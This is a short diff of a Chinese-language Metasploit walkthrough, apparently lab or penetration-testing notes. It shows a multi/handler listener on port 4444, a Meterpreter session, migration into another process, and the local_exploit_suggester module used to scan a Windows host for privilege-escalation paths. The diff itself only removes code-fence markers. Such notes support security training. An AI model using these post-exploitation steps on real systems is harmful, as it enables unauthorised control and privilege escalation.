@@ -31,13 +31,12 @@ lport => 4444
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
 
 尝试迁移到一个进程，例如资源管理器，它的会话id为1，这意味着它是互动
-```
 ctl+z
 y
 use multi/recon/local_exploit_suggester
 set session 1
 run
-```
+
 [2]use multi/recon/local_exploit_suggester //扫描当前系统 看：Windows 版本、补丁情况、已装驱动、权限配置
 
 (Meterpreter 1)(C:\Users\tony\music) > migrate 4700
